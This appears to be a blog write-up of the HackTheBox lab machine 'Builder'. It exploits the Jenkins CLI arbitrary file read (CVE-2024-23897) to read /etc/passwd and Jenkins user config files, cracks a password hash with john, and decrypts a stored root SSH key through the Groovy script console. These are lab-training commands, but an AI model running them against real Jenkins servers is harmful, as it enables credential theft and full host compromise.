---
title: Builder
date: 2026-02-26
categories: [CTFs, HackTheBox]
tags: [medium, linux, cve, jenkins, docker]
media_subpath: /assets/img/HackTheBox/Builder
image: 
    path: Builder.webp
    lqip: data:image/webp;base64,UklGRlIAAABXRUJQVlA4IEYAAABQAwCdASoUAAsAPzmGulOvKSWisAgB4CcJZQAAQurAm4+UAAD+6PEPKXfqEfDpJ+g3DsjQbJu6f6QjHmCXgMi990FAi6AA
    alt: Info Card
---

## Machine Info

Builder is a medium-difficulty Linux machine that features a Jenkins instance. The Jenkins instance is found to be vulnerable to the [CVE-2024-23897](https://nvd.nist.gov/vuln/detail/CVE-2024-23897){:target="_blank"} vulnerability that allows unauthenticated users to read arbitrary files on the Jenkins controller file system. An attacker is able to extract the username and password hash of the Jenkins user `jennifer`. Using the credentials to login into the remote Jenkins instance, an encrypted SSH key is exploited to obtain root access on the host machine.

## Scanning

### Open Ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.252.250 -oN allports
```

![Nmap Results: Open Ports](allports.webp)
_Open Ports_

### Service Detection

```bash
nmap -p22,8080 -sCV 10.129.252.250 -oN services
```

![Nmap Results: Services](services.webp)
_SSH & Jenkins_

## Jenkins Arbitrary File Read | CVE-2024-23897

Since there are only two open ports on the target and we don't have credentials to use `ssh`, we will focus our attention in **port 8080** which is running a vulnerable version of [Jenkins](https://www.jenkins.io/security/advisory/2024-01-24/){:target="_blank"}. It also have a stored [credential](https://www.jenkins.io/doc/book/using/using-credentials/){:target="_blank"} that belongs to the root user but we can not access it.

![Jenkins Version](page.webp)
_Jenkins 2.441_

![Credential](cred.webp)
_Root SSH private Key_

[CVE-2024-23897](https://www.trendmicro.com/en_us/research/24/c/cve-2024-23897.html){:target="_blank"} abuses a feature of the [CLI command](https://www.jenkins.io/doc/book/managing/cli/){:target="_blank"} parser that replaces an '@' character followed by a file path in an argument with the file's contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system.

![Arbitrary File Read Vuln](searchvuln.webp)
_Arbitrary File Read Vulnerability_

To download [Jenkins CLI](https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client){:target="_blank"} you can use the following command:

```bash
wget http://10.129.252.250:8080/jnlpJars/jenkins-cli.jar
```
![Jenkins CLI Download](downloadcli.webp)
_Downloading Jenkins CLI from the target_

Since its a **jar** file we have to execute it like this:

```bash
java -jar jenkins-cli.jar
```

![Jenkins CLI](javajar.webp)
_Jenkins CLI Usage_

Based on the instructions, we must use `-s` parameter to connect to the jenkins server.

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080
```

![Connecting to Jenkins](commands.webp)
_Commands & Descriptions_

According to the documentation of the vulnerability, we must use a **command + @ + the file to read**:

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ help @/etc/passwd
```

![Arbitray File Read Example](example.webp)
_Arbitary File Read Example_

The **help** command returns just few lines, however in the exploits available online they are using **connect-node** and when using it we saw it returns more content:

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ connect-node @/etc/passwd
```

![Reading /etc/passwd](connode.webp)
_Reading /etc/passwd_

### Getting Commands that Return more Info

To know which commands returns more content we can craft a special shell one-liner to execute every command and shows us the number of lines that command returns. First of all, we must have all the commands so we can iterate one by one. To do that, we can filter by the spaces just as shown in the image below:

>The execution of `jenkins-cli` returns content as stderr, so we must change it to stdout so we can work with it. **2>&1**.
{: .prompt-danger }

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ 2>&1 | grep -v '    ' | tr -d ' '
```

![Getting All Commands](getcommands.webp)
_Getting all commands to use_

Once we have the commands organized one by one, we will create a `for` loop to iterate through each line and execute the commands one by one in order to count the lines returned by each command.

```bash
for command in $(java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ 2>&1 | grep -v '    ' | tr -d ' '); do java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ $command @/etc/passwd 2>&1 | wc -l; done
```

![Lines](lines.webp)
_Number of lines returned by each command_

Now we are adding some text to get a clear output with the command and the lines it returns:

```bash
for command in $(java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ 2>&1 | grep -v '    ' | tr -d ' '); do echo "The command $command returns $(java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ $command @/etc/passwd 2>&1 | wc -l) lines"; done
```

![Clear Output](output.webp)
_Commands with number of lines_

You can also add some colors to have a better output:

```bash
for command in $(java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ 2>&1 | grep -v '    ' | tr -d ' '); do echo "The command \033[1;91m$command\033[0m returns \033[1;92m$(java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ $command @/etc/passwd 2>&1 | wc -l)\033[0m lines"; done
```

![Output with colors](colors.webp)
_Output with some colors_

>As shown above, there are some commands that returns more content than others and **connect-node** is one of those that returns more lines so we will use this command to read sensitive files from the victim machine.
{: .prompt-tip }

### Enumerating Sensitive Jenkins Files

Using the command `connect-node` we are going to enumerate the target. First of all, we are going to read the `/proc/self/environ`{: .filepath} which has information about the current process. In this case, all information about Jenkins like the **Home PATH**. We can also read the first flag which is stored in `/var/jenkins_home/`{: .filepath}

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ connect-node @/proc/self/environ
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ connect-node @/var/jenkins_home/user.txt
```

![Flag](environ.webp)
_Jenkins HOME PATH_

Here is the [Jenkins Directory Structure](https://devopspilot.com/content/jenkins/4-jenkins_home_folder_structure.html){:target="_blank"} where you can find interesting files to target. The information about users are usually stored in `$JENKINS_HOME/users/users.xml`{: .filepath}

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ connect-node @/var/jenkins_home/users/users.xml
```

![Users](users.webp)
_Reading users.xml_

Now you can target the config file of that user and display its passwordhash using the following command:

```bash
java -jar jenkins-cli.jar -s http://10.129.252.250:8080/ connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml 2>&1 | tail
```

![User Config](config.webp)
_Jennifer's Password Hash_

We found the hash for the user **jennifer**, so let's use `john` to crack it:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Cracking](john.webp)
_Using john to get the password for jennifer_

Now that we have credentials we can login to Jenkins

![Dashboard](dashboard.webp)
_Logged in as jennifer_

## Shell as root

Now that we are logged in as **jennifer** we can access the [credential](https://www.jenkins.io/doc/book/using/using-credentials/){:target="_blank"} we saw earlier.

![Credential](update.webp)
_Root SSH Private Key_

There are two ways to get this **credential**, using the browser or the **Arbitrary File Read** vulnerability we exploit before. However you must be logged in in order to decrypt it because, according to the documentation,  credentials configured in Jenkins are stored in an encrypted form on the controller Jenkins instance (encrypted by the Jenkins instance ID).

![Credential](credb.webp)
_Getting the credential via the source_

![Credential](key.webp)
_Getting the credential using the Arbitrary File Read_

Now we have to decrypt this credential, so in order to see it in clear text we have to use the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/){:target="_blank"}. Here is a link where you can find a way to decrypt this credential -> [How to decrypt Jenkins credentials?](https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml){:target="_blank"}

```groovy
println(hudson.util.Secret.decrypt("{HERE GOES THE CREDENTIAL}"))
```

![Root SSH Private Key](getid.webp)
_Root SSH Private Key_

We get the **id_rsa** for the root user so we can use it as an authentication method using `ssh`

>Remember to assign the correct permissions to the private key.
{: .prompt-warning }

![SSH](root.webp)
_Using private key to connect to the target via ssh_

![Flags](flags.webp)
_Hi! I'm root_

## Flags

- [x] user.txt

```bash
cat /home/jennifer/user.txt 
80f**************************o4d
```

- [x] root.txt

```bash
cat /root/root.txt 
61c**************************49f
``` 

<h2 style="text-align:center;">Thanks for reading! 🙌 🙌 🙌</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
